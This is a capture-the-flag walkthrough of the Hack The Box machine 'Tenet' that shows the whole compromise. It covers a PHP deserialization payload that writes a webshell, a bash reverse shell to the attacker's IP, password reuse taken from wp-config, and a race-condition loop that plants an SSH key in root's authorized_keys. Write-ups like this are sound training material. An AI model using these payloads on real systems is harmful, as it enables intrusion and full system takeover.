---
title: HTB: Tenet
url: https://0xdf.gitlab.io/2021/06/12/htb-tenet.html
date: 2021-06-12T13:45:00+00:00
difficulty: Medium [30]
os: Linux
tags: ctf, hackthebox, htb-tenet, nmap, gobuster, vhosts, wordpress, wpscan, php, deserialization, php-deserialization, webshell, password-reuse, credentials, race-condition, bash
---

![Tenet](https://0xdfimages.gitlab.io/img/tenet-cover.png)

Tenet provided a very straight-forward deserialization attack to get a foothold and a race-condition attack to get root. Both are the kinds of attacks seem more commonly on hard- and insane-rated boxes, but at a medium difficult here.

## Box Info

| Name | [Tenet](https://hackthebox.com/machines/tenet)  [Tenet](https://hackthebox.com/machines/tenet) [Play on HackTheBox](https://hackthebox.com/machines/tenet) |
| --- | --- |
| Release Date | [16 Jan 2021](https://twitter.com/hackthebox_eu/status/1402642148374290433) |
| Retire Date | 12 Jun 2021 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Tenet |
| Radar Graph | Radar chart for Tenet |
| First Blood User | 00:14:14[szymex73 szymex73](https://app.hackthebox.com/users/139466) |
| First Blood Root | 00:23:53[szymex73 szymex73](https://app.hackthebox.com/users/139466) |
| Creator | [egotisticalSW egotisticalSW](https://app.hackthebox.com/users/94858) |

## Recon

### nmap

`nmap` found two open TCP ports, SSH (22) and HTTP (80):

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.223
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-19 11:15 EST
Warning: 10.10.10.223 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.223
Host is up (0.18s latency).
Not shown: 64441 closed ports, 1092 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 25.57 seconds

root@kali# nmap -p 22,80 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.223
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-19 11:16 EST
Nmap scan report for 10.10.10.223
Host is up (0.086s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA)
|   256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA)
|_  256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.37 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu 18.04 Bionic.

### Website - TCP 80

#### Site

The site is the default Ubuntu Apache page:

![image-20210112112516339](https://0xdfimages.gitlab.io/img/image-20210112112516339.png)

#### Directory Brute Force

Running `gobuster` against the site finds a single directory, `/wordpress`:

```

root@kali# gobuster dir -u http://10.10.10.223 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 30 -o scans/gobuster-ip-root
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.223
[+] Threads:        30
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/01/19 11:20:36 Starting gobuster
===============================================================
/wordpress (Status: 301)
===============================================================
2021/01/19 11:25:01 Finished
===============================================================

```

### VHosts

I tried to load `http://10.10.10.223/wordpress`, but it looked very broken, as if none of the CSS or images were there. Wordpress is finicky about having the right hostname, but even without knowing that, the page source is full of links on `http://tenet.htb`. Before adding that to my `hosts` file, I wanted to check for any subdomains.

I started with `wfuzz` passing in different values in the `Host:` header, at first with no filters to find out the default page size:

```

root@kali# wfuzz -c -H "Host: FUZZ.tenet.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://10.10.10.223
********************************************************           
* Wfuzz 2.4.5 - The Web Fuzzer                         *           
********************************************************           

Target: http://10.10.10.223/                                       
Total requests: 100000                                             

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000002:   200        375 L    964 W    10918 Ch    "mail"
000000003:   200        375 L    964 W    10918 Ch    "remote"
000000004:   200        375 L    964 W    10918 Ch    "blog"
000000006:   200        375 L    964 W    10918 Ch    "server"
000000005:   200        375 L    964 W    10918 Ch    "webmail"                                       
^C                                                                 
Finishing pending requests...  

```

I’ll quickly kill it once I see that the default page is coming back at 10918 characters, so I’ll hide that with `--hh 10918`:

```

root@kali# wfuzz -c -H "Host: FUZZ.tenet.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://10.10.10.223 --hh 10918
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.223/
Total requests: 100000

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000001:   301        0 L      0 W        0 Ch        "www"
000037212:   400        12 L     53 W       442 Ch      "*"

Total time: 946.4860
Processed Requests: 100000
Filtered Requests: 99998
Requests/sec.: 105.6539

```

`www` is valid. I’ll add both `tenet.htb` and `www.tenet.htb` to `/etc/hosts:`

```
10.10.10.223 tenet.htb www.tenet.htb

```

`www.tenet.htb` seems to just return a 301 redirect to `tenet.htb`.

### tenet.htb - TCP 80

#### wpscan

Because it’s a WP site, I did start `wpscan` in the background with `wpscan --url http://tenet.htb -e ap,t,tt,u --api-token $WPSCAN_API`. It didn’t find anything I didn’t find just by clicking around.

#### Site

This page is a blog with three posts:

[![image-20210112134930474](https://0xdfimages.gitlab.io/img/image-20210112134930474.png)](https://0xdfimages.gitlab.io/img/image-20210112134930474.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20210112134930474.png)

Clicking around the site, I’ll notice a couple user names (protagonist is the author of all three posts, neil left a comment on “Migration”).

The Migration post is interesting:

> We’re moving our data over from a flat file structure to something a bit more substantial. Please bear with us whilst we get one of our devs on the migration, which shouldn’t take too long.
>
> Thank you for your patience

And the comment from neil:

> did you remove the sator php file and the backup?? the migration program is incomplete! why would you do this?!

#### sator.php

The comment from neil sent me looking for `sator.php`. It doesn’t exist on the `tenet.htb` vhost, but it is on the IP (perhaps that’s why neil thinks it’s gone):

```

root@kali# curl -s http://tenet.htb/sator.php
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at tenet.htb Port 80</address>
</body></html>
root@kali# curl -s http://10.10.10.223/sator.php
[+] Grabbing users from text file <br>
[] Database updated <br>

```

neil also mentioned a backup. With a couple guesses I found it with `curl -s http://10.10.10.223/sator.php.bak`:

```

<?php

class DatabaseExport
{
        public $user_file = 'users.txt';
        public $data = '';

        public function update_db()
        {
                echo '[+] Grabbing users from text file <br>';
                $this-> data = 'Success';
        }

        public function __destruct()
        {
                file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data);
                echo '[] Database updated <br>';
        //      echo 'Gotta get this working properly...';
        }
}

$input = $_GET['arepo'] ?? '';
$databaseupdate = unserialize($input);

$app = new DatabaseExport;
$app -> update_db();

?>

```

I can’t even begin to explain what dev was trying to do with this script, but the `unserialize` function immediately catches my eye.

## Shell as www-data

### Deserialization Theory

The PHP script above is taking user input and passing it to `unserialize`. Serialization is the act of taking an object from memory in some language (like PHP) and converting it to a format that can be saved as a file. The format can be binary (Python) or a string (PHP, JavaScript), it depends on what you are serializing. Deserialization is the reverse, taking that string or binary and converting it back into an object within the context of a running program.

Deserialization of input that an attack can control is a very risky operation, as it allows for the attacker to create objects, and objects have functions that can run code. IppSec did a really good [pair of videos on how this works](https://www.youtube.com/watch?v=HaW15aMzBUM). The important part here is the `__destruct` function. When a `DatabaseExport` object is freed (like at the end of the script), it will call this function. If I can pass in a serialized object of that type, in this case, the `__desctruct` function will write the contents of `$data` to the path in `$user_file`. There are several ways I could try, but I’ll just write a PHP webshell in this same directory.

### Create Serialized Object

To create a serialized PHP object, I’ll use PHP. This script will create the object with the right variables, and then print the serialized version:

```

<?php

class DatabaseExport {

    public $user_file = "0xdf.php";
    public $data = '<?php system($_REQUEST["cmd"]); ?>';

}

$sploit = new DatabaseExport;
echo serialize($sploit);
?>

```

Running it prints the serialized object:

```

root@kali# php exp.php 
O:14:"DatabaseExport":2:{s:9:"user_file";s:8:"0xdf.php";s:4:"data";s:34:"<?php system($_REQUEST["cmd"]); ?>";}

```

### Write Webshell

Now I’ll call `sator.php` passing this object. I can have `curl` url-encode GET parameters by passing in `-G` and `--data-urlencode`:

```

root@kali# curl -G http://10.10.10.223/sator.php --data-urlencode 'arepo=O:14:"DatabaseExport":2:{s:9:"user_file";s:8:"0xdf.php";s:4:"data";s:34:"<?php system($_REQUEST["cmd"]); ?>";}' --proxy 127.0.0.1:8080
[+] Grabbing users from text file <br>
[] Database updated <br>[] Database updated <br>

```

I’ll notice that “Database updated” prints twice. That’s once for the `DatabaseExport` object stored in `$app`, and once for my object.

Checking for the webshell, it’s there:

```

root@kali# curl http://10.10.10.223/0xdf.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

### Shell

To go from webshell to shell, I’ll trigger the webshell with the following reverse shell:

```

root@kali# curl -X GET http://10.10.10.223/0xdf.php -G --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.14.2/443 0>&1"'

```

At `nc`, a shell comes back:

```

root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.223.
Ncat: Connection from 10.10.10.223:53092.
bash: cannot set terminal process group (1519): Inappropriate ioctl for device
bash: no job control in this shell
www-data@tenet:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

I’ll upgrade the typical way with `python3 -c 'import pty;pty.spawn("bash")'`, then Ctrl-z, `stty raw -echo; fg`, then `reset`:

```

www-data@tenet:/var/www/html$ python3 -c 'import pty;pty.spawn("bash")' 
www-data@tenet:/var/www/html$ ^Z
[1]+  Stopped                 nc -lnvp 443
root@kali# stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@tenet:/var/www/html$

```

## Shell as neil

There’s one user on the box, neil:

```

www-data@tenet:/home$ ls
neil

```

On the blog, neil showed interest in the database. I’ll grab the creds from the `wp-config.php` file:

```

<?php                                                                                                         ...[snip]...
// ** MySQL settings - You can get this info from your web host ** //      
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );    

/** MySQL database username */
define( 'DB_USER', 'neil' );

/** MySQL database password */
define( 'DB_PASSWORD', 'Opera2112' );
                                                          
/** MySQL hostname */
define( 'DB_HOST', 'localhost' );                

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

define( 'WP_HOME', 'http://tenet.htb');  
define( 'WP_SITEURL', 'http://tenet.htb');
...[snip]...

```

Noticing the DB username was neil, before connecting to the DB, I tried `su` with that password, and it worked:

```

www-data@tenet:/var/www/html/wordpress$ su - neil
Password: 
neil@tenet:~$

```

From here I could grab `user.txt`:

```

neil@tenet:~$ cat user.txt
567d3388************************

```

That password also works for SSH access as neil:

```

root@kali# sshpass -p Opera2112 ssh neil@10.10.10.223
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-129-generic x86_64)
...[snip]...
Last login: Tue Jan 12 19:33:02 2021 from 10.10.14.2
neil@tenet:~$

```

## Shell as root

### Enumeration

`sudo -l` is typically my first check, and it finds something here:

```

neil@tenet:~$ sudo -l
Matching Defaults entries for neil on tenet:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:

User neil may run the following commands on tenet:
    (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh

```

neil can run `/usr/local/bin/enableSSH.sh` as root without password.

### Script Analysis

This file is a Bash script:

```

neil@tenet:~$ file /usr/local/bin/enableSSH.sh 
/usr/local/bin/enableSSH.sh: Bourne-Again shell script, ASCII text executable, with very long lines

```

The script itself defines three functions, `checkAdded()`, `checkFile()`, and `addKey()`, then it defines `$key`, calls `addKey`, and then `checkAdded`:

```

key="ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL
3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8s
iaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu"
addKey
checkAdded

```

`addKey` creates a temp file name with the format `/tmp/ssh-XXXXXXXX` where the `X` will be replaced with ransom characters, and then writes the `$key` into it. Then it calls `checkFile` on that file, then appends the contents to root’s `authorized_keys` file, and deletes the temp file:

```

addKey() {

        tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)

        (umask 110; touch $tmpName)

        /bin/echo $key >>$tmpName

        checkFile $tmpName

        /bin/cat $tmpName >>/root/.ssh/authorized_keys

        /bin/rm $tmpName

}

```

`checkFile` just uses Bash [conditional expressions](https://www.cyberciti.biz/tips/find-out-if-file-exists-with-conditional-expressions.html) to first check if the file exists and has size greater than 0 (`-s`), and then that it exists and is a regular file (`-f`). If either of those aren’t true, it prints and error, cleans up, and exits.

```

checkFile() {
                                      
        if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then

                /bin/echo "Error in creating key file!"

                if [[ -f $1 ]]; then /bin/rm $1; fi

                exit 1

        fi

}

```

After the call to `addKey` there’s a call to `checkAdded`:

```

checkAdded() {

        sshName=$(/bin/echo $key | /usr/bin/cut -d " " -f 3)

        if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then

                /bin/echo "Successfully added $sshName to authorized_keys file!"

        else

                /bin/echo "Error in adding $sshName to authorized_keys file!" 

        fi

} 

```

It uses `cut` to get the user from the SSH public key entry, and then checks that that names is in the `authorized_keys` file.

### Exploit

I can abuse this script by executing an attack on the temp file. I’ll watch for the file, and then change it’s contents to my SSH public key, so that my key is written into `/root/.ssh/authorized_keys`.

I want a loop that will run constantly, looking for files starting with `ssh-` in `/tmp`, and replacing their contents with my public key.

```

neil@tenet:~$ while true; do for fn in /tmp/ssh-*; do echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing" > $fn; done; done

```

Now, in a second terminal, I’ll run `sudo enableSSH.sh`:

```

neil@tenet:~$ sudo enableSSH.sh 
Error in adding root@ubuntu to authorized_keys file!

```

Because it’s an attack on a race condition, I will lose the race sometimes, and I’ll know that because it’ll say that it successfully added root@ubuntu. When it fails, nobody@nothing will be in `authorized_keys`, and I’ll get the failure message:

```

neil@tenet:~$ sudo enableSSH.sh 
Error in adding root@ubuntu to authorized_keys file!

```

Then I can connect over SSH as root:

```

root@kali# ssh -i ~/keys/ed25519_gen root@10.10.10.223
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-129-generic x86_64)
...[snip]...
root@tenet:~# cat root.txt
4173ef70************************

```